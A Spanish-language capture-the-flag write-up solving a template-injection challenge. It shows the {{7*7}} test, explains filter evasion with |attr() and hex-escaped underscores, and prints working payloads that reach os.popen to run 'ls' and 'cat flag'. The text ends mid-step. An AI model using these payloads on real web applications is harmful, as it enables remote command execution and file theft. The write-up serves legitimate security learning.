## Descripcion
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://xebec.cylabacademy.net:34168/)!
## Solucion
## 1. Acceso al sitio

Se accedió al sitio proporcionado por el reto:

```
http://xebec.cylabacademy.net:28041/
```

La página permite introducir texto para mostrar un anuncio.

## 2. Comprobación de SSTI

Primero se introdujo una operación matemática para comprobar si el contenido ingresado era interpretado por el motor de plantillas:

```
{{7*7}}
```

La página devolvió:

```
49
```

Esto confirmó que existe una vulnerabilidad **SSTI**, ya que la expresión fue procesada por el servidor.

## 3. Análisis del filtro

Un payload tradicional para aprovechar SSTI podría utilizar accesos como:

```
config.__class__.__init__.__globals__
```

Sin embargo, el reto elimina o bloquea determinados caracteres, por lo que este método no funciona directamente.

Para evadir el filtro se utilizaron las siguientes técnicas:

- `|attr()` para acceder a atributos sin utilizar directamente el punto `.`.
- `\x5f` para representar el carácter `_` en hexadecimal.
- `__getitem__` mediante `attr()` para acceder a elementos sin utilizar corchetes `[]`.

Por ejemplo:

```
\x5f
```

representa:

```
_
```

Por lo tanto:

```
\x5f\x5fclass\x5f\x5f
```

equivale a:

```
__class__
```

## 4. Construcción del payload

Se construyó el siguiente payload para acceder al objeto `os` y ejecutar comandos del sistema:

```
{{config|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("ls")|attr("read")()}}
```

El recorrido del payload es:

```
config
   ↓
__class__
   ↓
__init__
   ↓
__globals__
   ↓
__getitem__("os")
   ↓
os.popen("ls")
   ↓
read()
```

El comando:

```
ls
```

se utilizó para comprobar qué archivos se encontraban disponibles en el servidor.

## 5. Lectura de la bandera

Después de comprobar que era posible ejecutar comandos, se modificó el payload para leer el archivo de la bandera:

```
{{config|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("cat flag")|attr("read")()}}
```

El comando utilizado fue:
## Notas adicionales

## Referencias